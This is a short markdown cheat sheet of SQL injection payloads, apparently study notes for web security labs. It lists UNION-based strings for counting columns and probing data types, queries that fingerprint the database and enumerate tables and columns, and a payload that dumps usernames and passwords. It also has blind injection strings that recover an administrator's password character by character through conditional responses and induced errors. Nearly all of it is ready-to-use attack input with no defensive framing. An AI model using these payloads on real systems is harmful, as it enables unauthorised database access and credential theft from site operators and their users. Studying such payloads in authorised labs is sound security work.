## Find the number of columns being fetched:
- ' ORDER BY 1 -- 
- ' UNION SELECT NULL,NULL --
- ' UNION SELECT NULL FROM DUAL --

## Finding columns with a useful data type:
- ' UNION SELECT 'a',NULL,NULL,NULL --
- ' UNION SELECT NULL,'a',NULL,NULL --
- ' UNION SELECT NULL,NULL,'a',NULL --
- ' UNION SELECT NULL,NULL,NULL,'a' --

## Finding the info of database:
### Type and version:
- SELECT @@version
- SELECT * FROM v$version
- SELECT version()

### Name:
- SELECT database()

### Tables:
- SELECT table_name FROM information_schema.tables WHERE table_schema="db_name"

### Columns:
- SELECT column_name FROM information_schema.columns WHERE table_schema="db_name" AND table_name="table_name"

## Oracle tables:
- SELECT * FROM all_tables

## Oracle columns:
- SELECT * FROM all_tab_columns WHERE table_name = 'USERS'

## Multiple values within a single column:
### Oracle concat (||) operator:
- ' UNION SELECT username || '~' || password FROM users -- 

## Blind SQLI:
### Conditional respose sqli:
- ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

### Inducing conditional responses by triggering SQL errors:
- ' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
- ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a 
- ' AND (SELECT CASE WHEN (SUBSTR(password,13,1)='n') THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a

# SQLI Cheatsheet
- https://portswigger.net/web-security/sql-injection/cheat-sheet